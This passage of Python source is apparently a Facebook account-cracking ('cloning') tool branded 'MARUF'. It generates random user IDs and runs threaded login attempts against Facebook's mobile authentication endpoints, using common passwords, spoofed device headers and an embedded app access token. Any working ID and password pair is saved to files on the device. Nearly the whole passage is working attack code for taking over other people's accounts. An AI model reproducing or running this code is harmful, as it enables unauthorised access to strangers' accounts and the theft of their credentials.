            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def old_Tree():
    """
    Cloning method for accounts from 2009-2010.
    """
    user = []
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mOLD CODE {Y}:{G} 2009-2010")
    ask = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mSELECT {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mEXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID COUNT {Y}:{G} ")
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMethod B')
    linex()
    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G}{limit}{W}")
        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mHAR 5 MINT ME AEROPLANE MODE LGAO{G}")
        linex()
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            elif meth == 'B':
                pool.submit(login_2, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break


def login_1(uid):
    """
    Login attempt method 1.
    """
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMARUF  OK ID-M1\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mMARUF \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/MARUF -OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMARUF\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/MARUF -OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except Exception:
        time.sleep(5)


def login_2(uid):
    """
    Login attempt method 2.
    """
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMARUF -M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    
    for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
                    'x-fb-sim-hni': str(rr(20000, 40000)),
                    'x-fb-net-hni': str(rr(20000, 40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': window1(),
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mMARUF XD\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/MARUF -OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
                elif 'session_key' in po:
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mMARUF \x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/MARUF -OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except Exception as e:
            pass
    loop += 1

if __name__ == '__main__':
    BNG_71_()